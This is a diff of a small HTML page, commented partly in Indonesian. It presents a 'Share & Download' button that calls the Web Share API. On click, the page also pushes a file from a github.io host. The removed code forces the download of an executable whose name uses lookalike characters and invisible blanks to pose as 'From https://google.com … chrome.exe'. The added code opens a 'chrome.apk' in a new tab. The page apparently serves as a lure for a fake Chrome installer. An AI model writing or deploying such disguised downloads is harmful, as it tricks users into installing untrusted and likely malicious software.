@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Web Share + External Download</title>
+  <title>Web Share + Open APK</title>
 </head>
 <body style="height:100vh; display:flex; justify-content:center; align-items:center;">
 
-<button id="shareDownloadBtn">Share & Download File</button>
+<button id="shareDownloadBtn">Share & Open APK</button>
 
 <script>
 document.getElementById("shareDownloadBtn").onclick = async function() {
@@ -13,9 +13,9 @@ document.getElementById("shareDownloadBtn").onclick = async function() {
     if (navigator.share) {
         try {
             await navigator.share({
-                title: 'Example Text File',
-                text: 'Check out this file!',
-                url: 'https://example.com'  // bisa diganti ke URL apa saja
+                title: 'Example APK File',
+                text: 'Check out this APK!',
+                url: 'https://example.com'
             });
             console.log('Sharing success!');
         } catch(err) {
@@ -25,14 +25,8 @@ document.getElementById("shareDownloadBtn").onclick = async function() {
         alert('Web Share API not supported on this browser.');
     }
 
-    // 2. Download file eksternal
-    const fileUrl = 'http://ecdnts-del.github.io/test-apk/From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe';
-    const a = document.createElement('a');
-    a.href = fileUrl;
-    a.download = 'From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe'; // nama file yang di-download
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    // 2. Buka file APK di tab baru
+    window.open('http://ecdnts-del.github.io/test-apk/chrome.apk', 'x');
 };
 </script>
 
